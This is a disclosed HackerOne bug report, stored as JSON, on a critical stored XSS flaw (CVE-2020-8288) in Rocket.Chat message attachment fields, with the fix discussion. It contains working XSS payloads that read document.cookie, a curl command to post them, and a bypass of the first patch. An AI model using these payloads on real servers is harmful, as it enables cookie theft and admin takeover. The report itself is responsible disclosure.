@@ -1,0 +1,421 @@
+{
+    "id": 899954,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84OTk5NTQ=",
+    "url": "https://hackerone.com/reports/899954",
+    "title": "XSS in message attachment fileds.",
+    "state": "Closed",
+    "substate": "resolved",
+    "severity_rating": "critical",
+    "readable_substate": "Resolved",
+    "created_at": "2020-06-16T21:19:49.402Z",
+    "submitted_at": "2020-06-16T21:19:49.402Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "fabianfreyer",
+        "url": "/fabianfreyer",
+        "profile_picture_urls": {
+            "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": false,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 19858,
+        "url": "https://hackerone.com/rocket_chat",
+        "handle": "rocket_chat",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "permissions": [],
+        "submission_state": "open",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": false,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "Rocket.Chat",
+            "twitter_handle": "RocketChat",
+            "website": "https://rocket.chat",
+            "about": "Rocket.Chat is a company built on open source values and a love for efficiency. The company is driven by our amazing community of contributors."
+        }
+    },
+    "has_bounty?": false,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [
+        "CVE-2020-8288"
+    ],
+    "singular_disclosure_disabled": false,
+    "disclosed_at": "2021-01-17T18:37:40.648Z",
+    "bug_reporter_agreed_on_going_public_at": "2020-12-18T18:37:40.122Z",
+    "team_member_agreed_on_going_public_at": null,
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to verify and then potentially issue a bounty, so be sure to take your time filling out the report!\n\n**Summary:** There is a Cross-Site Scripting vulnerability in the message attachment fields.\n\n**Description:**\n\nIf no custom renderer is set, the `specializedRendering` function will render any HTML provided in the `value` field of the attachment:\n\n```js\n\tspecializedRendering({ hash: { field, message } }) {\n\t\tlet html = '';\n\t\tif (field.type && renderers[field.type]) {\n\t\t\thtml = Blaze.toHTMLWithData(Template[renderers[field.type]], { field, message });\n\t\t} else {\n\t\t\t// consider the value already formatted as html\n\t\t\thtml = field.value;\n\t\t}\n\t\treturn `<div class=\"${ field.type }\">${ html }</div>`;\n\t},\n```\n\n## Releases Affected:\n\n  * Rocket.Chat up to 3.3.3\n\n## Steps To Reproduce (from initial installation to vulnerability):\n\n1. Get an Personal Access Token.\n2. Create a channel \"#cookies\"\n3. Invite administrators into \"#cookies\", e.g. by promising them yummy cookies.\n4. Put the following payload in a file, calling it `cookiesplz.json`:\n\n    ```\n    {\n        \"channel\": \"#cookies\",\n        \"text\": \"Hi, I'd like a cookie please\",\n        \"attachments\": [\n            {\n                \"text\": \"ohai\",\n                \"fields\": [\n                    {\n                        \"type\": \"hello from project pwner\",\n                        \"title\": \"pwn\",\n                        \"value\": \"test<img src=x onerror='alert(document.cookie);'/>\",\n                        \"short\": false\n                    }\n                ]\n            }\n        ]\n    }\n   ```\n\n5. Run the following curl request: `curl -H \"X-Auth-Token: <Token>\" -H \"X-User-Id: <user Id>\" -H \"Content-type:application/json\" https://<server>/api/v1/chat.postMessage -d @cookiesplz.json`\n\n## Supporting Material/References:\n\n  * https://docs.rocket.chat/api/rest-api/methods/chat/postmessage#attachment-field-objects\n\n## Suggested mitigation\n\n  * Don't render verbatim HTML from user input.\n  * Mitigate XSS using CSP headers.\n\n## Impact\n\nUsing this vulnerability, an attacker can steal cookies of other users, including administrators to elevate their privileges. They can leak a user’s messages, critically impacting confidentiality. An attack payload may also Exit or delete messages, potentially removing traces of exploits and critically impacting integrity and availability. Finally, by escalating privileges, an attacker can restart the server and edit important settings, impacting availability. By using XSS execution, an attacker may send the payload to other users, i.e. this vulnerability is \"wormable\" on the same server.\n\nIn the electron client, this XSS can be used to get remote code execution.",
+    "weakness": {
+        "id": 62,
+        "name": "Cross-site Scripting (XSS) - Stored"
+    },
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [],
+    "allow_singular_disclosure_at": "2021-01-17T18:37:40.180Z",
+    "allow_singular_disclosure_after": -82384591.7084689,
+    "singular_disclosure_allowed": true,
+    "vote_count": 15,
+    "voters": [
+        "rook1337",
+        "tess",
+        "ali",
+        "h4x0r_dz",
+        "mrsinister15",
+        "safisecu",
+        "kali_linux_1337_pixel_gamer_yt",
+        "therealjoedoran",
+        "sir-poppin",
+        "joshua555",
+        "and 5 more..."
+    ],
+    "severity": {
+        "rating": "critical",
+        "score": 9.9,
+        "author_type": "User",
+        "metrics": {
+            "attack_vector": "network",
+            "attack_complexity": "low",
+            "privileges_required": "low",
+            "user_interaction": "none",
+            "scope": "changed",
+            "confidentiality": "high",
+            "integrity": "high",
+            "availability": "high"
+        }
+    },
+    "structured_scope": null,
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 8320927,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugTriaged",
+            "message": "@fabianfreyer  - thanks for reporting. we are looking into it!",
+            "automated_response": false,
+            "created_at": "2020-06-17T14:39:22.209Z",
+            "updated_at": "2020-06-17T14:39:22.209Z",
+            "actor": {
+                "username": "markus-rocketchat",
+                "cleared": false,
+                "verified": false,
+                "url": "/markus-rocketchat",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "rocket_chat"
+        },
+        {
+            "id": 10058438,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @fabianfreyer \n\nwe finally have a fix for it here: https://github.com/RocketChat/Rocket.Chat/pull/19817\n\nif you have an opinion on it, we would be glad to hear your feedback\n\nbest\nMarkus",
+            "automated_response": false,
+            "created_at": "2020-12-10T04:52:20.696Z",
+            "updated_at": "2020-12-10T04:52:20.696Z",
+            "actor": {
+                "username": "markus-rocketchat",
+                "cleared": false,
+                "verified": false,
+                "url": "/markus-rocketchat",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "rocket_chat"
+        },
+        {
+            "id": 10061047,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "The patch merged in https://github.com/RocketChat/Rocket.Chat/pull/19817 is insufficient. The following payload still leads to XSS:\n```json\n{\n    \"channel\": \"#cookiesplz\",\n    \"text\": \"Hi, I'd like a cookie please\",\n    \"attachments\": [\n        {\n            \"text\": \"\",\n            \"fields\": [\n                {\n                    \"type\": \"\\\"><img src=x onerror='alert(document.cookie);'/></div><div foo=\\\"\",\n                    \"title\": \"\",\n                    \"value\": \"\",\n                    \"short\": false\n                }\n            ]\n        }\n    ]\n}\n```",
+            "automated_response": false,
+            "created_at": "2020-12-10T10:46:00.255Z",
+            "updated_at": "2020-12-10T10:46:00.255Z",
+            "actor": {
+                "username": "fabianfreyer",
+                "cleared": false,
+                "verified": false,
+                "url": "/fabianfreyer",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "rocket_chat"
+        },
+        {
+            "id": 10062925,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "thank you. I passed it to the team",
+            "automated_response": false,
+            "created_at": "2020-12-10T14:13:33.917Z",
+            "updated_at": "2020-12-10T14:13:33.917Z",
+            "actor": {
+                "username": "markus-rocketchat",
+                "cleared": false,
+                "verified": false,
+                "url": "/markus-rocketchat",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "rocket_chat"
+        },
+        {
+            "id": 10075936,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Might I propose the attached patch to address this vulnerability? This does not rely on a potentially brittle RegExp-based custom HTML escaping function.",
+            "automated_response": false,
+            "created_at": "2020-12-11T16:37:48.319Z",
+            "updated_at": "2020-12-11T16:37:48.319Z",
+            "actor": {
+                "username": "fabianfreyer",
+                "cleared": false,
+                "verified": false,
+                "url": "/fabianfreyer",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "attachments": [
+                {
+                    "id": 1113148,
+                    "filename": "0001-Fix-XSS-vulnerability-in-specialized-rendering.patch",
+                    "type": "text/x-patch",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/btlghozye6eyvwa8c5bfsy672gqk?response-content-disposition=attachment%3B%20filename%3D%220001-Fix-XSS-vulnerability-in-specialized-rendering.patch%22%3B%20filename%2A%3DUTF-8%27%270001-Fix-XSS-vulnerability-in-specialized-rendering.patch&response-content-type=text%2Fx-patch&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRZXXXBVF%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T071411Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGIRenCSrfPcgTzSaO8QX26B9paJvvasIMLYRmcGzR1cAiBjFJbPsOh%2Bik2kOVW9ts7HvOwRMYnKfesm5Nr%2BufbNjSq6BQif%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMsePPIpSJgdLj%2FGf1Ko4FqUJrhAMTg0ZIyb%2B1aVR%2FG44A2mOWZ6x6vGGcep4SvdMaIalmDAmh2pt6So6Qy6pOK2n939v4zbyM6seXirKyRXHKw3iQWhNjJuaJXlE%2FHpe8gmE3e2QADfkOI3u9bV1ho7yEPZHObU5ZkaCwbi3Is6ImJkL6vs5%2F4gEiKto44SQ1kryLDSiuArhEXZm3namcAI5Cjv0xN6eu3QFAwj26WQudVPnFodb9J2UU%2BNY62kiYfZwCkdUYNCV3h3WO77dhZEOKF7EVU2zEwT6i3iwfTz%2FuYPJii%2Bj5JLVrGySxCqLuu7dmgYLq3whyU6X8PjOFtZBZEAQZqoJikhB8g%2BEOp1A6ftYalZsJZFufaQH3B63suBHFinWrFMw%2FCCWa9eHCl%2BvLuhqDl1SvtrU5%2FxQ2fOB3XGBONTD%2B7q0ErqKRM8dzbyvym3KfNnlCZgsbpNp8yTkuBi4eos5SilEGPcT9n6ouE5N9DXS43l4YybpYIky11BVuk2UWkfEK3dJQnhFHIhOYMavdPRSa7lmdi2kEnxCTOXdkGUH%2FKAGLNRsYfow9oEoy4YZGB0FoX8Eq%2B08e452Whmi1JpkJiIRgenUwOU%2B87HWCJrJf%2BS0MSQDs5iILTtYS5iFbalf2GVWwSWLgfVrXYuasVIFmEyHP8cTyFTVVPWf7FbGzfvp2BXB%2BogUB2swB7y6hxqQQu0KsPAmJA4sEdO85nj80PQJYTchcTvnWpMZN1bO5y6Oa4j8pxE08cwvACkQ9eBEhdppZSTKhqiv6TYPjMrRiojGlm2WUIOpmXmZDBKwNL6CzTXZdt%2B2d3t8MhZGBnzal2u85ZD2a4VfqP%2BIWfF4PUlDbjBFrFINI07I%2BobnCRgS0mEUuMJubtqcGOrIBqq44iCmenp9XE9yUHVBdv6l%2BN3SN3TDA8%2BUOBKb0BjOOfC5%2F8dCdNYNF5%2B1thGdyGBRX0juTvEz1KUixIrQ38a2zYJ9WpJoFs%2BFZvOxXJIyeou8u5PXPnplCwDvyxlLqF78G8s7SPGknl0RozlWjJuX%2B7qWoaqc41gdx%2FiYArbSOEB1N32UD3yAr4%2Fn4%2BUBFO41EsEWEoOZ6cTRB3vEOpPx39KopEbOmfSAZ0iPUbZ6J1g%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8edcbc2df72b4e741729a7a8246dfc81c5f686b2658dd5d17c38ef8f864715a8"
+                }
+            ],
+            "genius_execution_id": null,
+            "team_handle": "rocket_chat"
+        },
+        {
+            "id": 10077200,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Thanks a lot. We are discussing your suggestion",
+            "automated_response": false,
+            "created_at": "2020-12-11T18:02:12.310Z",
+            "updated_at": "2020-12-11T18:02:12.310Z",
+            "actor": {
+                "username": "markus-rocketchat",
+                "cleared": false,
+                "verified": false,
+                "url": "/markus-rocketchat",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "rocket_chat"
+        },
+        {
+            "id": 10111478,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @fabianfreyer \n\nwe have added another PR to the previous one: https://github.com/RocketChat/Rocket.Chat/pull/19854\nbut without creating elements. if you have any feedback, please let us know\n\nthank you",
+            "automated_response": false,
+            "created_at": "2020-12-15T13:51:56.058Z",
+            "updated_at": "2020-12-15T13:51:56.058Z",
+            "actor": {
+                "username": "markus-rocketchat",
+                "cleared": false,
+                "verified": false,
+                "url": "/markus-rocketchat",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "rocket_chat"
+        },
+        {
+            "id": 10143673,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "While I could at the moment not find a way to circumvent this check, I very much agree with the comment by user234461 on the [StackOverflow answer] that proposes the same escape function:\n> Manually adding a random subset of encodable characters is likely storing up trouble for yourself and your colleagues down the line. There should be a single authority for which characters should be encoded, probably the browser or failing that a specific library that's likely to be comprehensive and maintained.\n\nFrom my point of view, this can be closed.\n\n[StackOverflow answer]: https://stackoverflow.com/questions/18749591/encode-html-entities-in-javascript/39243641#39243641",
+            "automated_response": false,
+            "created_at": "2020-12-18T13:14:21.815Z",
+            "updated_at": "2020-12-18T13:14:21.815Z",
+            "actor": {
+                "username": "fabianfreyer",
+                "cleared": false,
+                "verified": false,
+                "url": "/fabianfreyer",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "rocket_chat"
+        },
+        {
+            "id": 10146457,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugResolved",
+            "message": "Thanks a lot for the additional info. I passed it to the devs.\n\nAnd many thanks again for the report to help making RC more secure.\n\nBest \nMarkus",
+            "automated_response": false,
+            "created_at": "2020-12-18T18:28:01.729Z",
+            "updated_at": "2020-12-18T18:28:01.729Z",
+            "actor": {
+                "username": "markus-rocketchat",
+                "cleared": false,
+                "verified": false,
+                "url": "/markus-rocketchat",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "reporter": {
+                "username": "fabianfreyer",
+                "url": "/fabianfreyer"
+            },
+            "genius_execution_id": null,
+            "team_handle": "rocket_chat"
+        },
+        {
+            "id": 10146530,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "Wonderful. Will this make it into a Release? I saw that yesterday’s 3.9.2 did not include these patches.",
+            "automated_response": false,
+            "created_at": "2020-12-18T18:37:40.143Z",
+            "updated_at": "2020-12-18T18:37:40.143Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "fabianfreyer",
+                "cleared": false,
+                "verified": false,
+                "url": "/fabianfreyer",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "rocket_chat"
+        },
+        {
+            "id": 10149166,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "yes, release is currently being built",
+            "automated_response": false,
+            "created_at": "2020-12-18T23:30:45.492Z",
+            "updated_at": "2020-12-18T23:30:45.492Z",
+            "actor": {
+                "username": "markus-rocketchat",
+                "cleared": false,
+                "verified": false,
+                "url": "/markus-rocketchat",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "rocket_chat"
+        },
+        {
+            "id": 10394644,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2021-01-17T18:37:40.719Z",
+            "updated_at": "2021-01-17T18:37:40.719Z",
+            "actor": {
+                "url": "/rocket_chat",
+                "ibb": false,
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "profile": {
+                    "name": "Rocket.Chat"
+                }
+            },
+            "genius_execution_id": null,
+            "team_handle": "rocket_chat"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "category": "researcher",
+            "can_view?": true,
+            "can_create?": false
+        }
+    ]
+}
